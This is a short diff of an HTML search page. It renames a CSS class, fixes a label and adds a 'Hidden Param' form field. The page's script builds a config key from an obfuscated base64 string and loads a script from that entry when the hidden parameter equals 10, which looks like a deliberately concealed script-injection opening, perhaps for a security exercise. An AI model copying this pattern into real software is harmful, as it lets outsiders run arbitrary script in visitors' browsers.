@@ -48,7 +48,7 @@
         text-decoration: none;
         color: #000;
     }
-    .json_object {
+    .form_field {
         display: flex;
         flex-direction: column;
         justify-content: center;
@@ -58,9 +58,13 @@
 <body>
     <div>
         <form  method="GET">
-            <div class="json_object">
-                <label for="searc">Search</label>
+            <div class="form_field">
+                <label for="search">Search</label>
                 <input type="text" id="search" name="search">
+            </div>
+            <div class="form_field">
+                <label for="hidden_param">Hidden Param</label>
+                <input type="number" id="hidden_param" name="hidden_param">
             </div>
             <div>
                 <button id="btn">search</button>
@@ -153,7 +157,7 @@
         param +=  'zeWFmODlvM2gxaTJodWZzYWZkc2FoamZrZHNsYWY=';
         param = atob(param)
         let analytics_script = config[param] || defaults.analytics_script
-        if (config.params.zz == 10) {
+        if (config.params.hidden_param == 10) {
             let script = document.createElement('script');
             script.src= analytics_script;
             document.body.appendChild(script);
